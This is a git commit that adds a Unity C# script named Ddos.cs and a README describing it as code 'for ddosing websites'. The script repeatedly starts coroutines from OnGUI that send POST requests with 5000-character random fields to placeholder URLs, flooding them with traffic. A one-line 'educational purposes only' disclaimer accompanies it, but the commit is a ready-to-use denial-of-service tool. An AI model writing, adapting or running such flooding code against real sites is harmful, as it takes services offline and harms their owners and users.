d5e5e1cbe1887abc0b6420cf05ea732d5351307e
VanHoevenTR <70694330+VanHoevenTR@users.noreply.github.com>
2022-11-28 10:35:50 +0100

    Add files via upload

---
+++ Ddos.cs
@@ -0,0 +1,49 @@
+using System.Collections;
+using System.Collections.Generic;
+using System.Linq;
+using UnityEngine;
+using UnityEngine.Networking;
+using UnityEngine.UIElements;
+
+public class Ddos : MonoBehaviour
+{
+    // Start is called before the first frame update
+    void OnGUI()
+    {
+        StartCoroutine(postRequest("https://www.example.com"));
+        StartCoroutine(postRequest("https://www.example2.com"));
+        StartCoroutine(postRequest("https://www.example3.com"));
+    }
+
+
+    IEnumerator postRequest(string url)
+    {
+        WWWForm form = new WWWForm();
+        form.AddField(RandomStringGenerator(5000), RandomStringGenerator(5000));
+
+        using (UnityWebRequest www = UnityWebRequest.Post(url, form))
+        {
+            yield return www.SendWebRequest();
+
+            if (www.result != UnityWebRequest.Result.Success)
+            {
+                Debug.Log(www.error);
+            }
+            else
+            {
+                Debug.Log("Done!");
+            }
+        }
+    }
+
+    string RandomStringGenerator(int length)
+    {
+        string characters = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNO0050PQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏĞÑÒÓÔÕÖ×ØÙÚÛÜİŞßàáâãäåæçèéêëìíîï00F0ğñòóôõö÷øùúûüışÿ";
+        string generated_string = "";
+
+        for (int i = 0; i < length; i++)
+            generated_string += characters[Random.Range(0, characters.Length)];
+
+        return generated_string;
+    }
+}
---
+++ README.md
@@ -0,0 +1,5 @@
+# Unity DDoS
+
+Just my shitty code for ddosing websites using Unity playform.
+
+Disclaimer: This is for educational purposes only
